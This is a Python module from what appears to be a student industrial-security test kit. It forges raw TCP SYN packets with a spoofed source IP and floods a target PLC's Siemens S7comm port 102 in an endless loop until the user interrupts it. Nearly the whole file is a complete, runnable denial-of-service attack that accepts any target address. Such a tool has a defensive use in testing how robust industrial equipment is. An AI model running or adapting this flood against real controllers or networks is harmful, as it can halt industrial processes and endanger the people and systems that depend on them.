###############################################################################
# Projet : Mallette de Test de Sécurité Industrielle
# Fichier : dos.py
# Auteur : Sylvain PALOP LAUZERAL 
# Version : 2.0 (Version Intégrée)
# Date : 2026
# Formation : BTS CIEL (Cybersécurité, Informatique, Électronique)
# Description : Module de Stress Test / Syn Flood réseau à haute vitesse
#               pour l'évaluation de la robustesse de la pile TCP de l'automate.
###############################################################################

import sys
import os
import socket
import struct

def run_attack(target_ip):
    # Port standard du protocole S7comm (Siemens)
    PORT_CIBLE = 102
    # IP source fictive pour la génération des paquets bruts
    IP_SOURCE = "172.21.3.99" 

    print("\n" + "="*60)
    print(f"🚀 LANCEMENT DU STRESS TEST (SYN FLOOD) SUR : {target_ip}:{PORT_CIBLE}")
    print("="*60)
    print("[*] Configuration de la socket brute (Raw Socket)...")

    # Fonction interne pour le calcul de la somme de contrôle (Checksum)
    def generer_checksum(msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1])
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    try:
        # Création de la socket brute (nécessite d'être root / sudo via scan.py)
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("\n💥 Erreur : Privilèges insuffisants !")
        print("[!] Ce module nécessite les droits root. Lancez l'outil principal avec 'sudo'.")
        return
    except Exception as e:
        print(f"\n💥 Erreur de création de la socket : {e}")
        return

    # --- FORGE DU PAQUET IP ---
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0  
    ip_id = 54321
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(IP_SOURCE)
    ip_daddr = socket.inet_aton(target_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

    # --- FORGE DU PAQUET TCP (Flag SYN activé) ---
    tcp_source = 12345
    tcp_dest = PORT_CIBLE
    tcp_seq = 454
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_fin = 0
    tcp_syn = 1  
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0

    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

    tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

    # --- CALCUL DU CHECKSUM ---
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = struct.pack('!4s4sBBH', ip_saddr, ip_daddr, placeholder, protocol, tcp_length) + tcp_header
    tcp_check = generer_checksum(psh)
    
    tcp_header = struct.pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)

    # Assemblage final du paquet malveillant
    paquet = ip_header + tcp_header

    print("\n🧨 Bombardement de paquets SYN en cours à haute vitesse...")
    print("[!] Appuyez sur CTRL+C pour stopper l'attaque et libérer l'appareil.")

    # Boucle de flood
    try:
        while True:
            s.sendto(paquet, (target_ip, 0))
    except KeyboardInterrupt:
        print("\n\n🛑 Attente de l'opérateur : Fin du Stress Test.")
        print("💡 L'automate va reprendre ses communications normales d'ici quelques secondes.")

if __name__ == "__main__":
    # Si scan.py envoie l'IP en paramètre (ex: python3 dos.py 172.21.3.75)
    if len(sys.argv) > 1:
        run_attack(sys.argv[1])
    else:
        # Mode autonome si exécuté tout seul
        target = input("[?] IP de l'automate cible : ")
        run_attack(target)
